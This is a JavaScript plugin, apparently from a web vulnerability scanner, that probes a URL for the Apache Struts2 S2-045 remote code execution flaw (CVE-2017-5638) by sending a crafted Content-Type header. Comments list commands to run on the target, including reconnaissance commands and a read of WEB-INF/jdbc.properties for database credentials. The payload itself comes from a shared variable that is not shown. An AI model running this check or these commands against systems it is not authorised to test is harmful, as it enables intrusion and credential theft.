
module.exports={
	tags:"web,struts2,045,cve-2017-5638,20175638",
	"ID":"020102",
	des:"CVE-2017-5638,struts2 045Vulnerability detection",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-045",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-032.war"],
	urls:["https://cwiki.apache.org/confluence/display/WW/S2-045",
	"https://nvd.nist.gov/vuln/detail/CVE-2017-5638"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self;
		// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
		//  && cat #curPath/WEB-INF/jdbc.propertis
		// if(/\/$/.test(url))url = url.substr(0, url.length - 1);
		_s.request(_s.fnOptHeader({method: 'POST',uri: url.replace(/\?.*?$/gmi,'')
		    ,headers:
		    {
		    	"User-Agent": _s.g_szUa,
		    	// encodeURIComponent不能编码 2017-07-18
		    	"Content-Type":_s.g_postData
		    }})
		  ,function (error, response, body)
		  {
		    // console.log(error||body);
		  	_s.error(error);
		  	body = String(body);
		  	_s.fnShowBody(body);
	  		if(body)
	  		{
	  			body = _s.fnCheckVul1(String(body));

	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
	  			// console.log(url + "\n"+body);
	  			_s.fnDoBody(body,"s2-045",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":_s.g_postData};
	  				fnCbk(_s.copyO2O(r,o),_t);
	  			});
	  		}
		  }
		);
	}
};